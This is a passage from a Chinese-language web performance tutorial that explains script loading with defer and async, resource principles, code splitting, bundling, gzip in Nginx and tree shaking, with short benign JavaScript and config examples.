data-srcset="/static/2021-07-21-15-19-34-b12d3e9d4e8d3cc357f3f1f598c91c90-f8f03.png 200w,\n/static/2021-07-21-15-19-34-b12d3e9d4e8d3cc357f3f1f598c91c90-d8034.png 400w,\n/static/2021-07-21-15-19-34-b12d3e9d4e8d3cc357f3f1f598c91c90-55e1c.png 689w" data-sizes="(max-width: 689px) 100vw, 689px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>defer 会在 HTML 解析完成后，按照脚本出现的次序再顺序执行；而 async 则是下载完成就立即开始执行，同时阻塞页面解析，不保证脚本间的执行顺序。</p>\n<p>根据它们的特点，推荐在一些与主业务无关的 JavaScript 脚本上使用 async。例如统计脚本、监控脚本、广告脚本等。这些脚本一般都是一份独立的文件，没有外部依赖，不需要访问 DOM，也不需要有严格的执行时机限制。在这些脚本上使用 async 可以有效避免这些非核心功能的加载影响页面解析速度。</p>\n<h2 id="页面文档压缩"><a href="#%E9%A1%B5%E9%9D%A2%E6%96%87%E6%A1%A3%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面文档压缩</h2>\n<p>HTML 的文档大小也会极大影响响应体下载的时间。一般会进行 HTML 内容压缩（uglify）的同时，使用文本压缩算法（例如 gzip）进行文本的压缩。关于资源压缩这一块，在下一节的内容中还会再详细进行介绍。</p>\n<h1 id="页面静态资源"><a href="#%E9%A1%B5%E9%9D%A2%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>页面静态资源</h1>\n<p>在上一节中，我们介绍了基本的页面解析机制，通过对资源加载顺序和脚本加载的控制，避免了无谓的阻塞，优化了解析性能。</p>\n<p>也正如上一站中所说，这时浏览器除了解析页面 DOM 外，还会对页面包含的静态资源发起请求，请求回来后会执行或使用资源。</p>\n<p>首先从宏观上来了解一下：</p>\n<h2 id="总体原则"><a href="#%E6%80%BB%E4%BD%93%E5%8E%9F%E5%88%99" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总体原则</h2>\n<p>这一部分会涉及到各类常见的静态资源：JavaScript 脚本、CSS 样式表、图片、字体等。不同资源的优化措施既有联系又有差别，后续会以各类资源为维度，针对性介绍其优化的关注点和手段。</p>\n<p>但咱们还是要先从整体维度上进行一些分析。其实在总体原则上，各类资源的优化思路都是大体类似的，包括但不限于：</p>\n<ul>\n<li>减少不必要的请求</li>\n<li>减少包体大小</li>\n<li>降低应用资源时的消耗</li>\n<li>利用缓存</li>\n</ul>\n<p>为了大家能更好理解各类优化实施策略从何而来，先初步扩展一下以上的思路。</p>\n<h3 id="减少不必要的请求"><a href="#%E5%87%8F%E5%B0%91%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少不必要的请求</h3>\n<p>核心是希望能够减少请求的数量，因为浏览器对同源请求有并发上限的限制（例如 Chrome 是 6），所以在 HTTP/1.1 下，请求过多可能会导致请求被排队了。一个典型场景就是一些图库类型的网站，页面加载后可能需要请求十数张图片。</p>\n<p>同时，TCP/IP 的拥塞控制也使其传输有慢启动（slow start）的特点，连接刚建立时包体传输速率较低，后续会渐渐提速。因此，发送过多的“小”请求可能也不是一个很好的做法。</p>\n<p>减少不必要的请求主要分为几个维度：</p>\n<ul>\n<li>对于不需要使用的内容，其实不需要请求，否则相当于做了无用功；</li>\n<li>对于可以延迟加载的内容，不必要现在就立刻加载，最好就在需要使用之前再加载；</li>\n<li>对于可以合并的资源，进行资源合并也是一种方法。</li>\n</ul>\n<h3 id="减少包体大小"><a href="#%E5%87%8F%E5%B0%91%E5%8C%85%E4%BD%93%E5%A4%A7%E5%B0%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少包体大小</h3>\n<p>包体大小对性能也是有直接影响的。显然同样速率下，包体越小，传输耗时越低，整体页面加载与渲染的性能也会更好。</p>\n<p>减少包体大小常用的方式包括了：</p>\n<ul>\n<li>使用适合当前资源的压缩技术；</li>\n<li>避免在响应包体里“塞入”一些不需要的内容。</li>\n</ul>\n<h3 id="降低应用资源时的消耗"><a href="#%E9%99%8D%E4%BD%8E%E5%BA%94%E7%94%A8%E8%B5%84%E6%BA%90%E6%97%B6%E7%9A%84%E6%B6%88%E8%80%97" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>降低应用资源时的消耗</h3>\n<p>以上主要的关注点都在页面资源加载的效率，其实有些时候，浏览器去执行或使用资源的也是有消耗的。例如在 JavaScript 执行了一段 CPU 密集的计算，或者进行频繁的 DOM 操作，这些都会让 JavaScript 的执行变成影响性能的一大问题。虽然今天的像 V8 这样的引擎已经很快了，但是一些不当的操作仍然会带来性能的损耗。</p>\n<p>此外，像是 CSS 选择器匹配、图片的解析与处理等，都是要消耗 CPU 和内存的。也许这些不太常成为性能杀手，但是某些特性场合下，了解它们也许会对你有所帮助。</p>\n<h3 id="利用缓存"><a href="#%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>利用缓存</h3>\n<p>还记得咱们这趟旅程从哪出发的么？没错，缓存。</p>\n<p>在旅程的第一站，我们介绍了浏览器访问一个 url 时的多级缓存策略。千万不要忘了，这些静态子资源也是网络请求，它们仍然可以利用之前介绍的完整缓存流程。缓存在很多时候会是一个帮你解决性能问题的非常有效的手段。</p>\n<p>由于第一站已经对缓存进行了详细介绍，所以缓存这部分，在这一站里只会在针对资源类型再补充一些内容。</p>\n<h2 id="针对各类资源的性能优化"><a href="#%E9%92%88%E5%AF%B9%E5%90%84%E7%B1%BB%E8%B5%84%E6%BA%90%E7%9A%84%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>针对各类资源的性能优化</h2>\n<p>以上的原则可以指导我们针对性地优化各类资源。下面我就以资源类型为维度，详细介绍其中涉及到的优化点与优化措施。</p>\n<h2 id="javascript"><a href="#javascript" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>JavaScript</h2>\n<p>随着 Web 的发展，JavaScript 从以前只承担简单的脚本功能，到现在被用于构建大型、复杂的前端应用，经历了很大的发展。这也让它在当下的前端应用中扮演了一个非常重要的角色，因此在这一节首先来看看的我们熟悉的 JavaScript。</p>\n<h3 id="减少不必要的请求-1"><a href="#%E5%87%8F%E5%B0%91%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E8%AF%B7%E6%B1%82-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少不必要的请求</h3>\n<p>在进行 JavaScript 优化时，我们还是秉承总体思路，首先就是减少不必要的请求。</p>\n<h4 id="代码拆分（code-split）与按需加载"><a href="#%E4%BB%A3%E7%A0%81%E6%8B%86%E5%88%86%EF%BC%88code-split%EF%BC%89%E4%B8%8E%E6%8C%89%E9%9C%80%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>代码拆分（code split）与按需加载</h4>\n<p>相信熟练使用 webpack 的同学对这一特性都不陌生。</p>\n<p>虽然整体应用的代码非常多，但是很多时候，我们在访问一个页面时，并不需要把其他页面的组件也全部加载过来，完全可以等到访问其他页面时，再按需去动态加载。核心思路如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="59622217821819290000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`document.getElementById(\'btn\').addEventListener(\'click\', (e) => {\n  // 在这里加载 chat 组件相关资源 chat.js\n  const script = document.createElement(\'script\');\n  script.src = \'/static/js/chat.js\';\n  document.getElementsByTagName(\'head\')[0].appendChild(script);\n});`, `59622217821819290000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'btn\'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">\'click\'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n  <span class="token comment">// 在这里加载 chat 组件相关资源 chat.js</span>\n  <span class="token keyword">const</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">\'script\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">\'/static/js/chat.js\'</span><span class="token punctuation">;</span>\n  document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">\'head\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>在按钮点击的监听函数中，我动态添加了 <code class="language-text">&lt;script&gt;</code> 元素。这样就可以实现在点击按钮时，才加载对应的 JavaScript 脚本。</p>\n<p>代码拆分一般会配合构建工具一起使用。以 webpack 为例，在日常使用时，最常见的方式就是通过 dynamic import 来告诉 webpack 去做代码拆分。webpack 编译时会进行语法分析，之后遇到 dynamic import 就会认为这个模块是需要动态加载的。相应的，其子资源也会被如此处理（除非被其他非动态模块也引用了）。</p>\n<p>在 webpack 中使用代码拆分最常见的一个场景是基于路由的代码拆分。目前很多前端应用都在使用 SPA（单页面应用）形式，或者 SPA 与 MPA（多页面应用）的结合体，这就会涉及到前端路由。而页面间的业务差异也让基于路由的代码拆分成为一个最佳实践。</p>\n<p>当然，如果你不使用 webpack 之类的构建工具，你也可以选择一个 AMD 模块加载器（例如 RequireJS）来实现前端运行时上的异步依赖加载。</p>\n<h4 id="代码合并"><a href="#%E4%BB%A3%E7%A0%81%E5%90%88%E5%B9%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>代码合并</h4>\n<p>我们在总体思路里有提到，减少请求的一个方法就是合并资源。试想一个极端情况：我们现在不对 node_modules 中的代码进行打包合并，那么当我们请求一个脚本之前将可能会并发请求数十甚至上百个依赖的脚本库。同域名下的并发请求数过高会导致请求排队，同时还可能受到 TCP/IP 慢启动的影响。</p>\n<p>当然，在很多流行的构建工具中（webpack/Rollup/Parcel），是默认会帮你把依赖打包到一起的。不过当你使用其他一些工具时，就要注意了。例如使用 FIS3 时，就需要通过配置声明，将一些 common 库或 npm 依赖进行打包合并。又或者使用 Gulp 这样的工具，也需要注意进行打包。</p>\n<p>总之，千万不要让你的碎文件散落一地。</p>\n<h3 id="减少包体大小-1"><a href="#%E5%87%8F%E5%B0%91%E5%8C%85%E4%BD%93%E5%A4%A7%E5%B0%8F-1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>减少包体大小</h3>\n<h4 id="代码压缩"><a href="#%E4%BB%A3%E7%A0%81%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>代码压缩</h4>\n<p>JavaScript 代码压缩比较常见的做法就是使用 UglifyJS 做源码级别的压缩。它会通过将变量替换为短命名、去掉多余的换行符等方式，在尽量不改变源码逻辑的情况下，做到代码体积的压缩。基本已经成为了前端开发的标配。在 webpack 的 production 模式下是默认开启的；而在 Gulp 这样的任务流管理工具上也有 gulp-uglify 这样的功能插件。</p>\n<p>另一个代码压缩的常用手段是使用一些文本压缩算法，gzip 就是常用的一种方式。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-e856f.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 15.218902015288393%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAcElEQVQI14WNsQ7DIBBD+f/PyxClAVpIEQwkIlzFcWRpLXVvnzzYlnynlttqgLVQeAa/hbzvpZytNRG5fqLc5vVqUkqVCAOjdYSv1Ht//0M55629x4hBpbPoaXrM85FzpRfOjTGY+xeRAcvM+IES8QNFgqm3VFbIUAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 09 40 34" title="" data-src="/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-fee1c.png" data-srcset="/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-a67b7.png 200w,\n/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-0b187.png 400w,\n/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-fee1c.png 800w,\n/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-b1a91.png 1200w,\n/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-95179.png 1600w,\n/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-5d5ba.png 2400w,\n/static/2021-07-22-09-40-34-299f67203482cdb4e29971cae47d41ea-e856f.png 2878w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>上图中响应头的 Content-Encoding 表示其使用了 gzip。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-e856f.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 15.288394718554551%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAj0lEQVQI1xXH0RKDIAxEUf//D9uqgzIGEENCEEVpO6U752Fv1892smG21FjKK5+LFx+LduQot98YTLhXY1ANk3bhabaNb4xnp7R+vEawjiVdd23ycdZawVoNBokRKUp6f76lXKvfWrrEi7iWnVLTMIwAwMwiwkQciOM+gzdgE/8XRUopx3EghsgxCPU45px/bCGm2ie32A4AAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 09 52 07" title="" data-src="/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-fee1c.png" data-srcset="/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-a67b7.png 200w,\n/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-0b187.png 400w,\n/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-fee1c.png 800w,\n/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-b1a91.png 1200w,\n/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-95179.png 1600w,\n/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-5d5ba.png 2400w,\n/static/2021-07-22-09-52-07-07e9a4c398f9051defa1eff262dc6fcf-e856f.png 2878w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>深色的数字表示压缩后的大小为 22.0KB，浅色部分表示压缩前的大小为 91.9KB，压缩比还是挺大的，很有效果。一般服务器都会内置相应模块来进行 gzip 处理，不需要我们单独编写压缩算法模块。例如在 Nginx 中就包含了 ngx<em>http</em>gzip_module 模块，通过简单的配置就可以开启。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="83634303437679950000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`gzip            on;\ngzip_min_length 1000;\ngzip_comp_level 6;\ngzip_types      application/javascript application/x-javascript text/javascript;`, `83634303437679950000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title=""\n              >\n                \n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">gzip            on;\ngzip_min_length 1000;\ngzip_comp_level 6;\ngzip_types      application/javascript application/x-javascript text/javascript;</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id="tree-shaking"><a href="#tree-shaking" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Tree Shaking</h4>\n<p>Tree Shaking 最早进入到前端的视线主要是因为 Rollup。后来在 webpack 中也被实现了。其本质是通过检测源码中不会被使用到的部分，将其删除，从而减小代码的体积。例如：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="32622371030309093000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// 模块 A\nexport function add(a, b) {\n  return a + b;\n}\n\nexport function minus(a, b) {\n  return a - b;\n}\n\n// 模块 B\nimport { add } from \'module.A.js\';\nconsole.log(add(1, 2));`, `32622371030309093000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// 模块 A</span>\n<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">minus</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n\n<span class="token comment">// 模块 B</span>\n<span class="token keyword">import</span> <span class="token punctuation">{</span> add <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">\'module.A.js\'</span><span class="token punctuation">;</span>\nconsole<span class="token 